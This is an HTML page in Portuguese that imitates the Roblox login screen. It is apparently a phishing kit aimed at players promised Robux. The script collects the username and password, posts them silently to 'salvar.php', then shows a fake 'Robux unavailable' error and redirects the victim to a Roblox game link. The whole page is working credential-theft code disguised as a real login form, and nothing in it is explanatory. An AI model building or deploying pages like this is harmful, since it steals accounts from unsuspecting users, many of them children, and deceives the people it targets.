<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox | Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Hammersmith+One&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-black: #000000;
            --card-gray: #2B2D2F;
            --input-gray: #393B3D;
            --text-white: #FFFFFF;
            --text-gray: #ADB1B5;
            --footer-gray: #656668;
            --btn-disabled: #3E4042;
            --rbx-red: #F6465D;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg-black);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            font-family: 'Titillium Web', sans-serif;
            color: var(--text-white);
            overflow: hidden;
        }

        header { width: 100%; display: flex; justify-content: center; padding-top: 20px; margin-bottom: 15px; }
        .roblox-logo { width: 200px; height: auto; max-width: 80%; object-fit: contain; }

        .login-card {
            background-color: var(--card-gray);
            width: 90%;
            max-width: 400px;
            padding: 30px 25px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
        }

        h2 { font-family: 'Hammersmith One', sans-serif; font-size: 22px; margin: 0 0 5px 0; color: var(--text-gray); }
        .subtitle { color: var(--text-gray); font-size: 13px; margin-bottom: 25px; display: block; }

        input {
            width: 100%;
            padding: 14px 12px;
            background-color: var(--input-gray);
            border: 1px solid #111;
            border-radius: 8px;
            color: var(--text-white);
            font-size: 16px;
            outline: none;
            margin-bottom: 10px;
        }
        input:focus { border-color: #FFFFFF; }

        .btn-entrar {
            width: 100%;
            padding: 13px;
            background: var(--btn-disabled);
            color: rgba(255, 255, 255, 0.4);
            border: 1px solid transparent;
            border-radius: 8px;
            font-size: 17px;
            font-weight: 700;
            cursor: not-allowed;
            margin-top: 10px;
            transition: 0.3s;
            position: relative;
        }

        .btn-entrar.active {
            background: transparent;
            color: var(--text-white);
            border: 1px solid var(--text-white);
            cursor: pointer;
        }

        #error-container { display: none; animation: fadeIn 0.4s ease forwards; }
        .error-text { color: var(--rbx-red); font-weight: 600; font-size: 16px; margin: 15px 0; display: block; }

        .btn-voltar {
            width: 100%;
            padding: 12px;
            background: #FFFFFF;
            color: #000000;
            border: none;
            border-radius: 8px;
            font-weight: 800;
            font-size: 15px;
            text-decoration: none;
            display: inline-block;
            margin-top: 10px;
        }

        .loader {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.2);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin { to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        footer { margin-top: auto; padding-bottom: 15px; text-align: center; }
        .footer-copy { color: var(--footer-gray); font-size: 10px; }
    </style>
</head>
<body>

    <header><img src="logo.png" alt="Roblox" class="roblox-logo"></header>

    <div class="login-card">
        <div id="login-content">
            <h2>Adicione a conta</h2>
            <span class="subtitle">Fazer autenticação para prosseguir.</span>
            
            <form id="loginForm">
                <input type="text" name="usuario" id="usuario" placeholder="Usuário/e-mail/telefone" required>
                <input type="password" name="senha" id="senha" placeholder="Senha" required>
                
                <button type="submit" id="btnSubmit" class="btn-entrar" disabled>
                    <span id="textBtn">Entrar</span>
                    <div class="loader" id="loader"></div>
                </button>
            </form>
        </div>

        <div id="error-container">
            <h2>Ops!</h2>
            <span class="subtitle">Verificação concluída.</span>
            <span class="error-text">Robux indisponível para esse usuário.</span>
            <a href="https://www.roblox.com/pt/games/6358567974/Salon-de-Fiestas" class="btn-voltar">Voltar</a>
        </div>
    </div>

    <footer><div class="footer-copy">© 2026 Roblox Corporation.</div></footer>

    <script>
        const userInp = document.getElementById('usuario');
        const passInp = document.getElementById('senha');
        const submitBtn = document.getElementById('btnSubmit');
        const loginForm = document.getElementById('loginForm');
        const loginContent = document.getElementById('login-content');
        const errorContainer = document.getElementById('error-container');
        const loader = document.getElementById('loader');
        const textBtn = document.getElementById('textBtn');

        function validar() {
            if (userInp.value.trim().length > 0 && passInp.value.length >= 8) {
                submitBtn.classList.add('active');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('active');
                submitBtn.disabled = true;
            }
        }

        userInp.addEventListener('input', validar);
        passInp.addEventListener('input', validar);

        loginForm.addEventListener('submit', function(event) {
            event.preventDefault(); // Impede o redirecionamento imediato
            
            textBtn.style.display = 'none';
            loader.style.display = 'block';
            submitBtn.style.pointerEvents = 'none';

            // Coleta os dados do formulário
            const formData = new FormData(loginForm);

            // ENVIA PARA O PHP SEM MUDAR DE PÁGINA
            fetch('salvar.php', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // Após o envio ser concluído, espera 2 segundos e mostra o erro
                setTimeout(() => {
                    loginContent.style.display = 'none';
                    errorContainer.style.display = 'block';
                }, 2000);
            })
            .catch(error => {
                // Caso dê erro no servidor, ainda assim mostra a tela de erro para o usuário
                loginContent.style.display = 'none';
                errorContainer.style.display = 'block';
            });
        });
    </script>

</body>
</html>
